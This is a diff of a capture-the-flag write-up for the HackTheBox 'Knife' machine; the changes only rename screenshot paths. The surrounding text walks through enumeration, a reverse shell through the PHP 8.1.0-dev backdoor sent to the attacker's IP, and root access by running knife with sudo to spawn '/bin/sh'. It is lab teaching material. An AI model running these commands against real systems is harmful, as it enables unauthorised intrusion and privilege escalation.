@@ -6,7 +6,7 @@
 
 I start with a simple nmap scan. This system is running an Apache web server on port 8- and OpenSSH over port 22. 
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled.png)
+![Untitled](POC/nmap.png)
 
 Most of these boxes run ssh over port 22 to allow users to ssh into the box once they obtain initial access, in order to provide a more stable shell. Because of this, I will focus on the web server for now.
 
@@ -14,7 +14,7 @@ Most of these boxes run ssh over port 22 to allow users to ssh into the box once
 
 I navigate to the website which looks pretty simple, and none of the buttons have been configured to navigate anywhere.
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%201.png)
+![Untitled](POC/website.png)
 
 I try adding `/index.php` to the end of the URL, and get the same page. This indicates to me that the website is PHP based. I’ll head to dirb to try and find some potential vectors.
 
@@ -22,7 +22,7 @@ I try adding `/index.php` to the end of the URL, and get the same page. This ind
 
 The scan comes back with nothing new besides `/server-status` which doesn’t help.
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%202.png)
+![Untitled](POC/dirb.png)
 
 With how little I have uncovered at this point, I begin to think this may be a vulnerability with a specific version. The SSH and Apache versions are not vulnerable, and the only other thing I know about this box is that the website runs PHP.
 
@@ -30,7 +30,7 @@ With how little I have uncovered at this point, I begin to think this may be a v
 
 I had neglected to check Wappalyzer when I initially enumerated the website, but looking at it now I find that the PHP is version 8.1.0. 
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%203.png)
+![Untitled](POC/wappalyzer.png)
 
 A quick google search reveals that this version of PHP is vulnerable to a backdoor which allows for remote code execution, just what I was looking for!
 
@@ -46,7 +46,7 @@ python3 rev.py http://knife.htb:80/ 10.10.14.2 1234
 
 Before I send the payload, I start up a netcat listener on port 1234 to catch the shell. Once I send the payload, I get the shell back almost immediately!
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%204.png)
+![Untitled](POC/reverse_shell.png)
 
 It seems I have obtained access as a user named james.
 
@@ -54,7 +54,7 @@ It seems I have obtained access as a user named james.
 
 Before I go any further, I navigate to the user’s home directory and grab the user flag.
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%205.png)
+![Untitled](POC/user_flag.png)
 
 # Privelege Escalation
 
@@ -62,7 +62,7 @@ Before I go any further, I navigate to the user’s home directory and grab the 
 
 When trying to escalate priviledges on linux boxes, my first step is always running `sudo -l` to see what commands the user can run as sudo. We get lucky and it looks like this user can run knife as sudo!
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%206.png)
+![Untitled](POC/james_sudo.png)
 
 ## Knife
 
@@ -74,10 +74,10 @@ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
 
 Using knife to execute the Ruby code I am given a new shell. Running `whoami` reveals I have obtained root access!
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%207.png)
+![Untitled](POC/root.png)
 
 ## Root Flag
 
 With root access I can grab the root flag from the root directory!
 
-![Untitled](Knife%207df145d6970d4502b2c19e173ea1a052/Untitled%208.png)
+![Untitled](POC/root_flag.png)
